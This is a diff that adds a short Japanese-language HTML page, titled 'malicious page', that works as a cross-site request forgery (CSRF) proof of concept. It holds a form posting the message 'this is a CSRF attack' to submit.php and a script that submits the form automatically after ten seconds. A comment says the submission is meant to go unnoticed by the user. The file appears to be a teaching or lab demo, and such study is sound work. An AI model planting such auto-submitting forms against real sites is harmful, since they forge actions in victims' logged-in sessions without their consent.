@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>悪意のあるページ</title>
+</head>
+<body>
+<h1>悪意のある操作</h1>
+
+<!-- ユーザーに気づかれないように、自動的に送信されるフォーム -->
+<form id="csrf_attack_form" action="./submit.php" method="POST">
+    <label for="message">10秒後自動でメッセージが投稿されます:</label><br>
+    <input 
+        type="text" 
+        id="message"
+        name="message"
+        value="これはCSRF攻撃です"
+    />
+</form>
+
+<script>
+    setTimeout(function() {
+        document.getElementById('csrf_attack_form').submit();
+    }, 10000)
+</script>
+</body>
+</html>
